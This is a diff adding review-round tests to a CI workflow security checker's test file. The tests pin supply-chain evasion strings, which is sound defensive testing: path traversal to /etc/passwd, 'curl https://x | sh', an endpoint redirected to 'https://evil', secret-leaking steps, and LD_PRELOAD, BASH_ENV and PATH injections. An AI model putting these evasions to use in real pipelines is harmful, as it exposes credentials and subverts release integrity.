@@ -8,7 +8,9 @@ import {
 	ALLOWED_ACTIONS,
 	ALLOWED_COMMANDS,
 	BETA_SIGNATURES,
+	CONTENTS_WRITE_JOBS,
 	CREDENTIAL_JOBS,
+	ENVIRONMENT_EXEMPT_JOBS,
 	HEAD_OBJECT_GUARD,
 	PRODUCTION_POINTERS,
 	R2_WRITERS,
@@ -16,11 +18,14 @@ import {
 	TEST_SIGNER_FLAG,
 	TEST_SIGNER_STEP,
 	artifactDirectoriesOf,
+	buildStepReasons,
 	casePatternMatches,
 	caseSkipPatternsOf,
 	checkWorkflows,
 	commandAllowlistReasons,
+	credentialJobReasons,
 	credentialStepReasons,
+	hasDotSegment,
 	headObjectGuardReasons,
 	ignoreScriptsEnabled,
 	isArtifactPath,
@@ -1440,7 +1445,7 @@ test("credential-bearing jobs may run only the allowlisted commands; every inter
 	assert.deepEqual(credentialStepReasons("helper() { echo hi; }\nhelper", { jobId: "publish-r2" }), []);
 	assert.match(credentialStepReasons("helper\nhelper() { echo hi; }", { jobId: "publish-r2" }).join("\n"), /runs helper, which is not on the command allowlist/);
 	// The word splitter marks the definition and the pattern words.
-	assert.deepEqual(splitWords("aws() { command aws \"$@\"; }").commands.map((command) => command.words.map((word) => `${word.text}${word.definesFunction ? "()" : ""}`)), [["aws()"], ["{", "command", "aws", "$@"], ["}"]]);
+	assert.deepEqual(splitWords("aws() { command aws \"$@\"; }").commands.map((command) => command.words.map((word) => `${word.text}${word.definesFunction ? "()" : ""}`)), [["aws()"], ["{"], ["command", "aws", "$@"], ["}"]]); // a bare `{` ends the command so a group body is inspected on its own (round 6, finding 7)
 	assert.deepEqual([...shellCommands("cat <<EOF\nnot a command\nEOF")].map((command) => [command.words.map((word) => word.text).join(" "), command.heredoc ?? false]), [["cat", false], ["not a command", true]]);
 });
 
@@ -1677,4 +1682,350 @@ test("the beta SHA256SUMS is signed and its bundle is verified and published nex
 		const problems = checkWorkflows(reader({ [RELEASE]: broken }));
 		assert.ok(problems.some((problem) => pattern.test(problem)), `${label}: expected ${pattern}, got:\n${problems.join("\n")}`);
 	}
+});
+
+// ---------------------------------------------------------------------------------------------
+// Review round 6. Each finding's exact evasion string is pinned here, whether the round-5 checker
+// already rejected it or not, so a later refactor cannot quietly let one through again.
+// ---------------------------------------------------------------------------------------------
+
+/** Appends a whole job before `publish-r2`. */
+function appendJob(text, jobYaml) {
+	const anchor = "\n  publish-r2:\n";
+	assert.ok(text.includes(anchor));
+	return text.replace(anchor, `${jobYaml}\n  publish-r2:\n`);
+}
+
+const SNEAKY_JOB = `
+  sneaky:
+    name: Publish outside the ordering
+    needs: [context, github-release]
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    env:
+      GH_TOKEN: \${{ secrets.GITHUB_TOKEN }}
+      PRODUCTION_VERSION: \${{ needs.context.outputs.production_version }}
+    steps:
+      - name: Publish early
+        run: |
+          set -euo pipefail
+          gh release edit "v\${PRODUCTION_VERSION}" --draft=false --latest
+`;
+
+test("every credential-bearing job is derived and must run in an environment; contents:write must sit in the ordering (round 6, finding 1)", () => {
+	const release = parse(readFileSync(RELEASE, "utf8"));
+	// The exemptions are exactly the three jobs the checker proves safe, and every other
+	// credential-bearing job in the checked-in workflow declares an environment.
+	assert.deepEqual(Object.keys(ENVIRONMENT_EXEMPT_JOBS).sort(), ["github-release", "github-release-beta", "sign"]);
+	assert.deepEqual([...CONTENTS_WRITE_JOBS].sort(), ["finalize-release", "github-release", "github-release-beta"]);
+	for (const [jobId, job] of Object.entries(release.jobs)) {
+		if (job.uses) continue;
+		if (isCredentialBearing(job) && !job.environment) assert.ok(ENVIRONMENT_EXEMPT_JOBS[jobId], `${jobId} holds a credential outside an environment without an exemption`);
+		assert.deepEqual(credentialJobReasons(jobId, job, release.jobs), [], jobId);
+	}
+	// A new contents:write job that needs neither an environment nor verify: the reviewer's exact
+	// scenario. Round 5 accepted it.
+	const sneaky = mutate(RELEASE, (text) => appendJob(text, SNEAKY_JOB));
+	const problems = checkWorkflows(reader({ [RELEASE]: sneaky }));
+	assert.ok(problems.some((problem) => /job 'sneaky' holds contents:write .* without being one of github-release, finalize-release, github-release-beta or needing 'verify'/.test(problem)), problems.join("\n"));
+	assert.ok(problems.some((problem) => /credential-bearing job 'sneaky' \(holds contents:write\) must run in a protected environment/.test(problem)), problems.join("\n"));
+	// `needs: verify` satisfies the ordering rule but not the environment rule.
+	const afterVerify = checkWorkflows(reader({ [RELEASE]: mutate(RELEASE, (text) => appendJob(text, SNEAKY_JOB.replace("needs: [context, github-release]", "needs: [context, verify]"))) }));
+	assert.ok(!afterVerify.some((problem) => /job 'sneaky' holds contents:write/.test(problem)), afterVerify.join("\n"));
+	assert.ok(afterVerify.some((problem) => /credential-bearing job 'sneaky' .* must run in a protected environment/.test(problem)), afterVerify.join("\n"));
+	// An environment satisfies the environment rule but not the ordering rule.
+	const inEnvironment = checkWorkflows(reader({ [RELEASE]: mutate(RELEASE, (text) => appendJob(text, SNEAKY_JOB.replace("    runs-on: ubuntu-latest\n", "    runs-on: ubuntu-latest\n    environment: release-r2\n"))) }));
+	assert.ok(inEnvironment.some((problem) => /job 'sneaky' holds contents:write/.test(problem)), inEnvironment.join("\n"));
+	assert.ok(!inEnvironment.some((problem) => /must run in a protected environment/.test(problem) && problem.includes("'sneaky'")), inEnvironment.join("\n"));
+	// Every other way of holding a credential is derived too: another write scope, write-all, a
+	// non-GITHUB_TOKEN secret at step level (the job-level env check does not see it).
+	for (const [label, edit] of [
+		["id-token:write", (yaml) => yaml.replace("contents: write", "id-token: write")],
+		["packages:write", (yaml) => yaml.replace("contents: write", "packages: write")],
+		["write-all", (yaml) => yaml.replace("    permissions:\n      contents: write\n", "    permissions: write-all\n")],
+		["a step-level secret", (yaml) => yaml.replace("contents: write", "contents: read").replace("      - name: Publish early\n        run: |", "      - name: Publish early\n        env:\n          HOMEBREW_TAP_TOKEN: ${{ secrets.HOMEBREW_TAP_TOKEN }}\n        run: |")],
+	]) {
+		const broken = mutate(RELEASE, (text) => appendJob(text, edit(SNEAKY_JOB)));
+		const found = checkWorkflows(reader({ [RELEASE]: broken }));
+		assert.ok(found.some((problem) => /credential-bearing job 'sneaky' \(holds .*\) must run in a protected environment/.test(problem)), `${label}:\n${found.join("\n")}`);
+	}
+	assert.deepEqual(credentialJobReasons("x", { permissions: { contents: "read" }, steps: [] }), []);
+	assert.deepEqual(credentialJobReasons("x", { permissions: { contents: "read" }, environment: "e", steps: [] }), []);
+	assert.match(credentialJobReasons("x", { permissions: { contents: "write" }, environment: "e", steps: [] }).join("\n"), /holds contents:write/);
+	assert.deepEqual(credentialJobReasons("x", { permissions: { contents: "write" }, environment: "e", needs: ["verify"], steps: [] }), []);
+	assert.match(credentialJobReasons("x", { permissions: "write-all", environment: "e", steps: [] }).join("\n"), /holds contents:write/);
+});
+
+test("each environment exemption is proved, not trusted (round 6, finding 1)", () => {
+	const variants = [
+		// sign: OIDC only.
+		["sign gains contents:write", (text) => text.replace("    permissions:\n      attestations: write\n      contents: read\n      id-token: write\n", "    permissions:\n      attestations: write\n      contents: write\n      id-token: write\n"), /job 'sign' may run without an environment only with exactly attestations: write, contents: read, id-token: write/],
+		["sign gains a secret", (text) => text.replace("    steps:\n      - name: Download assembled production artifacts\n        if: env.PUBLISH_PRODUCTION == 'true'", "    steps:\n      - name: Leak\n        env:\n          X: ${{ secrets.NPM_TOKEN }}\n        run: echo\n      - name: Download assembled production artifacts\n        if: env.PUBLISH_PRODUCTION == 'true'"), /job 'sign' may run without an environment only while it references no secret other than GITHUB_TOKEN/],
+		// github-release: drafts only.
+		["github-release edits to draft=false", (text) => text.replace('gh release edit "$TAG" --draft --target "$BUILD_REF" --notes-file notes/RELEASE_NOTES.md --title "$TAG"', 'gh release edit "$TAG" --draft=false --target "$BUILD_REF" --notes-file notes/RELEASE_NOTES.md --title "$TAG"'), /job 'github-release' may run without an environment only while (every release it creates or edits stays a draft|it never publishes a release)/],
+		["github-release creates without --draft", (text) => text.replace('            gh release create "$TAG" \\\n              --draft \\\n', '            gh release create "$TAG" \\\n'), /job 'github-release' may run without an environment only while every release it creates or edits stays a draft/],
+		["github-release marks latest", (text) => text.replace('gh release upload "$TAG" artifacts/* --clobber', 'gh release upload "$TAG" artifacts/* --clobber\n            gh release edit "$TAG" --draft --latest'), /job 'github-release' may run without an environment only while it never publishes a release/],
+		["github-release writes through gh api", (text) => appendStep(text, "github-release", runStep("Tag early", 'gh api --method POST "repos/${GITHUB_REPOSITORY}/git/refs" -f ref=refs/tags/x -f sha=$BUILD_REF')), /job 'github-release' may run without an environment only while gh api never writes/],
+		["github-release writes through gh api -X", (text) => appendStep(text, "github-release", runStep("Tag early", 'gh api -X PATCH "repos/${GITHUB_REPOSITORY}/releases/1" -F draft=false')), /job 'github-release' may run without an environment only while gh api never writes/],
+		["github-release runs git", (text) => appendStep(text, "github-release", runStep("Push", 'git -C artifacts push origin HEAD:refs/tags/x')), /job 'github-release' may run without an environment only while it never runs git/],
+		["github-release deletes a release", (text) => appendStep(text, "github-release", runStep("Delete", 'gh release delete "$TAG" --yes')), /job 'github-release' may run without an environment only while it never deletes a release/],
+		["github-release gains a secret", (text) => text.replace("      GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n      PRODUCTION_VERSION: ${{ needs.context.outputs.production_version }}\n    steps:\n      # No checkout: this job publishes artifacts, it does not run repository code.\n      - name: Download assembled production artifacts", "      GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n      PRODUCTION_VERSION: ${{ needs.context.outputs.production_version }}\n    steps:\n      # No checkout: this job publishes artifacts, it does not run repository code.\n      - name: Leak\n        env:\n          X: ${{ secrets.R2_BUCKET }}\n        run: echo\n      - name: Download assembled production artifacts"), /job 'github-release' may run without an environment only while it references no secret other than GITHUB_TOKEN/],
+		// github-release-beta: gated by the beta environment.
+		["github-release-beta no longer needs publish-beta-r2", (text) => text.replace("  github-release-beta:\n    name: Refresh the beta prerelease\n    needs: [context, publish-beta-r2]", "  github-release-beta:\n    name: Refresh the beta prerelease\n    needs: [context, sign]"), /job 'github-release-beta' may run without an environment only because it needs 'publish-beta-r2', which must run in one/],
+		["publish-beta-r2 leaves its environment", (text) => text.replace("    environment:\n      name: nightly-r2\n", ""), /job 'github-release-beta' may run without an environment only because it needs 'publish-beta-r2', which must run in one/],
+	];
+	for (const [label, edit, pattern] of variants) {
+		const broken = mutate(RELEASE, edit);
+		const problems = checkWorkflows(reader({ [RELEASE]: broken }));
+		assert.ok(problems.some((problem) => pattern.test(problem)), `${label}: expected ${pattern}, got:\n${problems.join("\n")}`);
+	}
+	// A draft edit with a literal `--draft` is what the checked-in job does and stays accepted.
+	assert.deepEqual(credentialJobReasons("github-release", { permissions: { contents: "write" }, steps: [{ run: 'gh release edit "$TAG" --draft --title x\ngh release create "$TAG" --draft artifacts/*\ngh api repos/x/releases --paginate --jq .' }] }), []);
+});
+
+test("an assignment handed to a wrapper is an assignment (round 6, finding 2)", () => {
+	const script = 'env PRODUCTION_VERSION=x aws s3 cp artifacts/a "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/a" --endpoint-url "$R2_ENDPOINT_URL"';
+	// Two independent rules reject it: the wrapper is not allowlisted, and the R2 walk now sees the reassignment.
+	assert.match(commandAllowlistReasons([...shellCommands(script)][0], { jobId: "publish-r2" }).join("\n"), /runs env, a wrapper/);
+	assert.match(r2StepReasons("publish-r2", script, { artifactDirectories: ["artifacts"] }).reasons.join("\n"), /reassigns PRODUCTION_VERSION/);
+	for (const [wrapped, pattern] of [
+		["sudo -E R2_BUCKET=other aws s3 ls --endpoint-url \"$R2_ENDPOINT_URL\" s3://x", /reassigns R2_BUCKET/],
+		["env -i NODE_OPTIONS=--import=/tmp/x.mjs node -e 1", /sets NODE_OPTIONS, which loads code/],
+		["nice -n 5 BASH_ENV=/tmp/x.sh bash -c 1", /sets BASH_ENV, which loads code/],
+	]) {
+		const command = [...shellCommands(wrapped)][0];
+		assert.match([...repositoryCodeReasons(command), ...r2StepReasons("publish-r2", wrapped, { artifactDirectories: ["artifacts"] }).reasons].join("\n"), pattern, wrapped);
+	}
+	const problems = checkWorkflows(reader({ [RELEASE]: mutate(RELEASE, (text) => appendStep(text, "publish-r2", runStep("Sneak in a prefix", `set -euo pipefail\n${script}`))) }));
+	assert.ok(problems.some((problem) => problem.includes("'publish-r2'") && /runs env, a wrapper/.test(problem)), problems.join("\n"));
+	assert.ok(problems.some((problem) => problem.includes("'publish-r2'") && /reassigns PRODUCTION_VERSION/.test(problem)), problems.join("\n"));
+});
+
+test("a . or .. segment is refused in every position of a credential-bearing step (round 6, finding 3)", () => {
+	const directories = ["artifacts", "notes"];
+	assert.equal(isArtifactPath("artifacts/../../etc/passwd", directories), false);
+	for (const evasion of ["artifacts/../../etc/passwd", "../x", "a/../b", "artifacts/./x", "./artifacts/x", "x=artifacts/../y", "key=@../x", "a:../b", "notes/.."]) {
+		assert.equal(hasDotSegment(evasion), true, evasion);
+	}
+	for (const fine of ["artifacts/x", "artifacts/SHA256SUMS.sigstore.json", ".isDraft", "--jq", ".[] | .id", "/tmp/head.err", "https://x/../y", '^[[:space:]]*version "${PRODUCTION_VERSION//./\\.}"', "s|/releases/v[0-9][^/\"]*/|/x/|g", "..x", "x..", "a..b/c"]) {
+		assert.equal(hasDotSegment(fine), false, fine);
+	}
+	const positions = [
+		["cp source", 'aws s3 cp artifacts/../../etc/passwd "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/passwd" --endpoint-url "$R2_ENDPOINT_URL"'],
+		["for file in", 'for file in artifacts/../../etc/*; do echo "$file"; done'],
+		["test -f", "test -f artifacts/../../etc/passwd"],
+		["sha256sum input", "sha256sum artifacts/../../etc/passwd"],
+		["an assignment", "src=artifacts/../../etc/passwd"],
+		["a redirection", "cat < artifacts/../../etc/passwd"],
+		["--notes-file", 'gh release create "$TAG" --draft --notes-file artifacts/../../etc/passwd'],
+		["--body-file", 'gh pr create --repo x --title t --body-file artifacts/../../etc/passwd'],
+		["-F body=@file", 'gh api --method POST repos/x/releases -F body=@artifacts/../../etc/passwd'],
+		["--input", "gh api --method POST repos/x/releases --input artifacts/../../etc/passwd"],
+		["inside a substitution", 'digest=$(sha256sum artifacts/../../etc/passwd | cut -d" " -f1)'],
+	];
+	for (const [label, script] of positions) {
+		const reasons = credentialStepReasons(script, { artifactDirectories: directories, jobId: "publish-r2" });
+		assert.ok(reasons.some((reason) => /names a path with a \. or \.\. segment|redirects a path with a \. or \.\. segment/.test(reason)), `${label}: got:\n${reasons.join("\n")}`);
+	}
+	// The workflow-level check reaches every credential-bearing job.
+	for (const jobId of ["publish-r2", "finalize-release", "publish-beta-r2", "github-release", "github-release-beta", "publish-npm", "tap-bump", "sign"]) {
+		const broken = mutate(RELEASE, (text) => appendStep(text, jobId, runStep("Sneak in a traversal", "set -euo pipefail\ntest -f artifacts/../../etc/passwd")));
+		const problems = checkWorkflows(reader({ [RELEASE]: broken }));
+		assert.ok(problems.some((problem) => problem.includes(`'${jobId}'`) && /names a path with a \. or \.\. segment/.test(problem)), `${jobId}:\n${problems.join("\n")}`);
+	}
+	// gh reads and sends files only from the downloaded artifacts or a literal /tmp file.
+	for (const [label, script, pattern] of [
+		["upload from /etc", 'gh release upload "$TAG" /etc/passwd', /gh release upload may only attach downloaded artifacts/],
+		["upload from an expansion", 'gh release upload "$TAG" "$leak"', /gh release upload may only attach downloaded artifacts/],
+		["upload from a glob outside", 'gh release upload "$TAG" /tmp/*', /gh release upload may only attach downloaded artifacts/],
+		["create with an asset outside", 'gh release create "$TAG" --draft --title "$TAG" /tmp/leak', /gh release create may only attach downloaded artifacts/],
+		["notes from /etc", 'gh release create "$TAG" --draft --notes-file /etc/passwd artifacts/*', /gh --notes-file must name a downloaded artifact/],
+		["notes from an expansion", 'gh release edit "$TAG" --draft --notes-file "$f"', /gh --notes-file must name a downloaded artifact/],
+		["--input from $HOME", 'gh api --method POST repos/x --input "$HOME/x"', /gh --input must name a downloaded artifact|names a configuration or credential file/],
+		["--field=key=@file", "gh api --method POST repos/x --field=body=@/etc/passwd", /gh --field key=@file must name a downloaded artifact/],
+		["an unknown release option", 'gh release create "$TAG" --draft --generate-notes-from /etc/passwd artifacts/*', /gh release create carries an option the checker does not know/],
+		["an option built from an expansion", 'gh release create "$TAG" "--$flag" artifacts/*', /gh release create carries an option the checker does not know|gh option --\$flag is built from an expansion/],
+		["release download", 'gh release download "$TAG" --dir artifacts', /gh release may only create, edit, upload, view, list here/],
+	]) {
+		const reasons = commandAllowlistReasons([...shellCommands(script)][0], { jobId: "github-release", artifactDirectories: directories });
+		assert.ok(reasons.some((reason) => pattern.test(reason)), `${label}: expected ${pattern}, got:\n${reasons.join("\n")}`);
+	}
+	for (const fine of [
+		'gh release upload "$TAG" artifacts/* --clobber',
+		'gh release create "$TAG" --draft --title "$TAG" --target "$BUILD_REF" --notes-file notes/RELEASE_NOTES.md artifacts/*',
+		'gh release edit beta --title "Beta (v${BETA_VERSION})" --target "$BUILD_REF" --notes-file /tmp/beta-release-notes.md --prerelease',
+		'gh release view "$TAG" --json isDraft,targetCommitish',
+		'gh api --method POST "repos/${GITHUB_REPOSITORY}/git/refs" -f ref=refs/tags/x -f sha=$BUILD_REF',
+	]) {
+		assert.deepEqual(commandAllowlistReasons([...shellCommands(fine)][0], { jobId: "github-release-beta", artifactDirectories: directories }), [], fine);
+	}
+});
+
+test("an expansion in command position is refused everywhere, and lifecycleReasons does not depend on the allowlist (round 6, finding 4)", () => {
+	const build = { workflow: RELEASE, jobId: "build" };
+	for (const script of ['manager=npm\n"$manager" ci', 'm=np; "${m}m" install', "$PM install", "`echo npm` ci", '"$(command -v npm)" ci']) {
+		const reasons = [...shellCommands(script)].flatMap((command) => lifecycleReasons(command, build));
+		assert.ok(reasons.some((reason) => /the command is a shell expansion, so the checker cannot tell whether it is a package manager/.test(reason)), `${script}: got:\n${reasons.join("\n")}`);
+	}
+	// ...in every job of both build workflows, credential-bearing or not.
+	for (const [path, jobId] of [[RELEASE, "build"], [RELEASE, "assemble"], [RELEASE, "validate-macos"], [RELEASE, "pack-npm"], [RELEASE, "verify"], [RELEASE, "publish-npm"], [STANDALONE, "build"]]) {
+		const broken = mutate(path, (text) => appendStep(text, jobId, runStep("Sneak in an install", 'manager=npm\n"$manager" ci')));
+		const problems = checkWorkflows(reader({ [path]: broken }));
+		assert.ok(problems.some((problem) => problem.startsWith(`${path}: job '${jobId}'`) && /the command is a shell expansion/.test(problem)), `${path} ${jobId}:\n${problems.join("\n")}`);
+	}
+	// Wrapper options that consume the next word no longer hide the package manager.
+	for (const script of ["nice -n 10 npm ci", "sudo -u root npm install", "env -u FOO npm ci", "exec -a x npm ci", "coproc worker { npm ci; }", "sh -c 'npm ci'", "timeout -s KILL 10 npm ci", "stdbuf -o 0 npm ci", "sudo -Eu root npm ci"]) {
+		const reasons = [...shellCommands(script)].flatMap((command) => [...lifecycleReasons(command, build), ...buildStepReasons(command, build)]);
+		assert.ok(reasons.some((reason) => /npm (ci|install) runs dependency lifecycle scripts/.test(reason)), `${script}: got:\n${reasons.join("\n")}`);
+	}
+	assert.deepEqual([...shellCommands('PATH="$NPM_CONFIG_PREFIX/bin:$PATH" X=1 sh /tmp/prime-agent-npm12-install.sh "$SMOKE_VERSION"')].flatMap((command) => lifecycleReasons(command, build)), []);
+});
+
+test("the standalone workflow's top level is scanned like the release workflow's (round 6, finding 5)", () => {
+	const header = "permissions:\n  contents: read\n\njobs:";
+	const variants = [
+		["a secret in env", `permissions:\n  contents: read\n\nenv:\n  NPM_TOKEN: \${{ secrets.NPM_TOKEN }}\n\njobs:`, /standalone-binaries\.yml: the workflow-level env NPM_TOKEN references a secret/],
+		["a preload in env", `permissions:\n  contents: read\n\nenv:\n  NODE_OPTIONS: --import=/tmp/x.mjs\n\njobs:`, /standalone-binaries\.yml: the workflow-level env sets NODE_OPTIONS, which loads code before any command runs/],
+		["a credential redirect in env", `permissions:\n  contents: read\n\nenv:\n  AWS_ENDPOINT_URL: https://evil\n\njobs:`, /standalone-binaries\.yml: the workflow-level env sets AWS_ENDPOINT_URL, which redirects/],
+		["a secret in defaults", `permissions:\n  contents: read\n\ndefaults:\n  run:\n    shell: bash -c "\${{ secrets.X }}" {0}\n\njobs:`, /standalone-binaries\.yml: the workflow-level defaults reference a secret/],
+		["a shell in defaults", `permissions:\n  contents: read\n\ndefaults:\n  run:\n    shell: python {0}\n\njobs:`, /standalone-binaries\.yml: the workflow-level defaults set shell 'python \{0\}'/],
+	];
+	for (const [label, replacement, pattern] of variants) {
+		const broken = mutate(STANDALONE, (text) => text.replace(header, replacement));
+		const problems = checkWorkflows(reader({ [STANDALONE]: broken }));
+		assert.ok(problems.some((problem) => pattern.test(problem)), `${label}: expected ${pattern}, got:\n${problems.join("\n")}`);
+	}
+	// The same shapes are still rejected in the release workflow.
+	const release = mutate(RELEASE, (text) => text.replace("permissions: {}\n\njobs:", "permissions: {}\n\nenv:\n  NPM_TOKEN: ${{ secrets.NPM_TOKEN }}\n\njobs:"));
+	assert.ok(checkWorkflows(reader({ [RELEASE]: release })).some((problem) => /build-binaries\.yml: the workflow-level env NPM_TOKEN references a secret/.test(problem)));
+});
+
+test("a path-qualified interpreter or an expanded script argument is refused in build jobs too (round 6, finding 6)", () => {
+	const build = { workflow: RELEASE, jobId: "build" };
+	// In a credential-bearing job the round-5 allowlist rejects both the path and the interpreter.
+	const credential = credentialStepReasons('dir=scripts; /usr/bin/node "$dir"/publish.mjs', { jobId: "publish-r2" });
+	assert.match(credential.join("\n"), /runs \/usr\/bin\/node through a path/);
+	// In a build job node is allowed, but not like this.
+	for (const [script, pattern] of [
+		['dir=scripts; /usr/bin/node "$dir"/publish.mjs', /runs node through a path/],
+		['dir=scripts; /usr/bin/node "$dir"/publish.mjs', /node runs a script named by an expansion/],
+		['dir=scripts; node "$dir"/publish.mjs', /node runs a script named by an expansion/],
+		['node "$SCRIPT"', /node runs a script named by an expansion/],
+		['node -- "$SCRIPT"', /node runs a script named by an expansion/],
+		['node -e "$CODE"', /node -e runs code from an expansion/],
+		['node "--$FLAG" scripts/x.mjs', /node carries an option built from an expansion/],
+		['python3 -m "$MOD"', /python3 runs a script named by an expansion/],
+		['sh -c "$CMD"', /sh -c runs code from an expansion/],
+		["sh -c 'npm ci'", /inside sh -c: npm ci runs dependency lifecycle scripts/],
+		["node /usr/lib/node_modules/npm/bin/npm-cli.js ci", /node runs a package manager's entry point/],
+		["node ./node_modules/.bin/tsx x.ts", /node runs a package manager's entry point/],
+		["curl https://x | sh", /sh reads its program from a pipe/],
+		["node - < scripts/x.mjs", /node reads its program from (stdin|<scripts)/],
+		["node <<'EOF'\nrequire('child_process').execSync('npm ci')\nEOF", /node reads its program from <</],
+		["node scripts/../evil/x.mjs", /node runs a script through a \. or \.\. segment/],
+	]) {
+		const reasons = [...shellCommands(script)].flatMap((command) => buildStepReasons(command, build));
+		assert.ok(reasons.some((reason) => pattern.test(reason)), `${script}: expected ${pattern}, got:\n${reasons.join("\n")}`);
+	}
+	for (const fine of [
+		"node scripts/resolve-release-context.mjs",
+		'node scripts/validate-macos-release.mjs "$artifacts" "$TARGET_PLATFORM" "$RUNNER_TEMP/x"',
+		"node -p \"require('./package.json').version\"",
+		'python3 -m http.server 18188 --bind 127.0.0.1 --directory "$SMOKE_ROOT"',
+		'sh /tmp/prime-agent-npm12-install.sh "$SMOKE_VERSION"',
+		"node --version",
+		"npm run build",
+		'echo "node $x"',
+	]) {
+		assert.deepEqual([...shellCommands(fine)].flatMap((command) => buildStepReasons(command, build)), [], fine);
+	}
+	// ...and the workflow-level check reaches the build jobs of both workflows.
+	for (const [path, jobId] of [[RELEASE, "build"], [RELEASE, "assemble"], [RELEASE, "pack-npm"], [STANDALONE, "build"]]) {
+		const broken = mutate(path, (text) => appendStep(text, jobId, runStep("Sneak in a script", 'dir=scripts; /usr/bin/node "$dir"/publish.mjs')));
+		const problems = checkWorkflows(reader({ [path]: broken }));
+		assert.ok(problems.some((problem) => problem.startsWith(`${path}: job '${jobId}'`) && /runs node through a path/.test(problem)), `${path} ${jobId}:\n${problems.join("\n")}`);
+		assert.ok(problems.some((problem) => problem.startsWith(`${path}: job '${jobId}'`) && /node runs a script named by an expansion/.test(problem)), `${path} ${jobId}:\n${problems.join("\n")}`);
+	}
+	assert.deepEqual(checkWorkflows(), []);
+});
+
+test("every way to run or prepare code around a command is refused in a credential-bearing job (round 6, finding 7)", () => {
+	const options = { artifactDirectories: ["artifacts"], jobId: "publish-r2" };
+	const cases = [
+		["coproc, simple form", "coproc node scripts/x.mjs", /runs coproc, a wrapper|runs node, which is not on the command allowlist/],
+		["coproc, named form", "coproc worker { node scripts/x.mjs; }", /runs coproc, a wrapper/],
+		["coproc, named form, inner command is still resolved", "coproc worker { python3 -c 1; }", /runs python3, which is not on the command allowlist/],
+		["coproc of an allowlisted command", 'coproc aws s3 ls --endpoint-url "$R2_ENDPOINT_URL" "s3://${R2_BUCKET}/"', /runs coproc, a wrapper/],
+		["builtin", 'builtin eval "node scripts/x.mjs"', /runs builtin, a wrapper|eval runs a command the checker cannot see/],
+		["command -p", "command -p node scripts/x.mjs", /runs command, a wrapper|runs node, which is not on the command allowlist/],
+		["exec -a NAME resolves the real command", "exec -a aws node scripts/x.mjs", /runs node, which is not on the command allowlist/],
+		["exec -a NAME with a path", "exec -a aws /usr/bin/python3 -c 1", /runs \/usr\/bin\/python3 through a path/],
+		["{ ...; } &", "{ node scripts/x.mjs; } &", /runs node, which is not on the command allowlist/],
+		["{ ...; } & is backgrounded", "{ node scripts/x.mjs; } &", /runs a command in the background/],
+		["( ... ) &", "( node scripts/x.mjs ) &", /runs node, which is not on the command allowlist/],
+		["( ... ) & is backgrounded", "( node scripts/x.mjs ) &", /runs a command in the background/],
+		["& backgrounding", "python3 -c 1 &\nwait", /runs python3, which is not on the command allowlist/],
+		["& backgrounding of an allowlisted command", 'aws s3 ls --endpoint-url "$R2_ENDPOINT_URL" "s3://${R2_BUCKET}/" &\nwait', /runs a command in the background, so its failure would go unnoticed/],
+		["wait after a background job", "sleep 1 &\nwait", /runs a command in the background/],
+		["trap body", "trap 'node scripts/x.mjs' EXIT", /trap changes how commands resolve or run/],
+		["trap body, inline code", "trap 'python3 -c 1' EXIT", /trap changes how commands resolve or run/],
+		["alias", "alias aws='node scripts/x.mjs'", /alias changes how commands resolve or run/],
+		["function shadowing an allowlisted name", "function aws { node scripts/x.mjs; }", /defines a shell function named aws/],
+		["function body is parsed", "function helper { python3 -c 1; }", /runs python3, which is not on the command allowlist/],
+		["name() body is parsed", "helper() { python3 -c 1; }\nhelper", /runs python3, which is not on the command allowlist/],
+		[". file", ". scripts/x.sh", /sources a file/],
+		["source file", "source /tmp/x.sh", /sources a file/],
+		["PROMPT_COMMAND", "PROMPT_COMMAND='node scripts/x.mjs'", /sets PROMPT_COMMAND, which loads code/],
+		["export PROMPT_COMMAND", "export PROMPT_COMMAND='python3 -c 1'", /sets PROMPT_COMMAND, which loads code/],
+		["PS4 with set -x", "PS4='$(python3 -c 1)'\nset -x", /sets PS4, which loads code/],
+		["readonly PS4", "readonly PS4='$(python3 -c 1)'", /sets PS4, which loads code/],
+		["PS0", "PS0='$(python3 -c 1)'", /sets PS0, which loads code/],
+		["BASH_ENV, plain assignment", "BASH_ENV=/tmp/x.sh", /sets BASH_ENV, which loads code/],
+		["BASH_ENV, prefix", "BASH_ENV=/tmp/x.sh bash -c 1", /sets BASH_ENV, which loads code/],
+		["BASH_ENV, typeset", "typeset BASH_ENV=/tmp/x", /sets BASH_ENV, which loads code/],
+		["ENV", "ENV=/tmp/x.sh", /sets ENV, which loads code/],
+		["CDPATH", "CDPATH=/tmp", /sets CDPATH, which loads code/],
+		["export CDPATH", "export CDPATH=/tmp", /sets CDPATH, which loads code/],
+		["local -x CDPATH", "local -x CDPATH=/tmp", /sets CDPATH, which loads code/],
+		["PATH", "PATH=/tmp:$PATH", /modifies PATH/],
+		["export PATH", "export PATH=/tmp:$PATH", /modifies PATH/],
+		["declare PATH", "declare -x PATH=/tmp:$PATH", /modifies PATH/],
+		["LD_PRELOAD, plain assignment", "LD_PRELOAD=/tmp/x.so", /sets LD_PRELOAD, which loads code/],
+		["LD_PRELOAD, declare -x", "declare -x LD_PRELOAD=/tmp/x.so", /sets LD_PRELOAD, which loads code/],
+		["LD_PRELOAD, prefix", "LD_PRELOAD=/tmp/x.so aws s3 ls", /sets LD_PRELOAD, which loads code/],
+		["read into PROMPT_COMMAND", "read -r PROMPT_COMMAND </tmp/x", /sets PROMPT_COMMAND, which loads code/],
+		["printf -v PROMPT_COMMAND", "printf -v PROMPT_COMMAND 'python3 -c 1'", /sets PROMPT_COMMAND, which loads code/],
+		["nameref onto PATH", "declare -n ref=PATH; ref=/tmp", /declare -n creates a name reference/],
+		["local nameref", "local -n ref=BASH_ENV", /local -n creates a name reference/],
+		["GLOBIGNORE", "GLOBIGNORE='*.sigstore.json'", /sets GLOBIGNORE, which loads code/],
+		["EXECIGNORE", "EXECIGNORE=/usr/bin/aws", /sets EXECIGNORE, which loads code/],
+		["BASH_LOADABLES_PATH", "BASH_LOADABLES_PATH=/tmp", /sets BASH_LOADABLES_PATH, which loads code/],
+		["BASH_XTRACEFD", "BASH_XTRACEFD=3", /sets BASH_XTRACEFD, which loads code/],
+		["SHELL", "SHELL=/tmp/x", /sets SHELL, which loads code/],
+		["enable -f", "enable -f /tmp/x.so aws", /enable changes how commands resolve or run/],
+		["BASH_FUNC export trick", "BASH_FUNC_aws%%='() { node scripts/x.mjs; }'", /through a path|executes a relative path/],
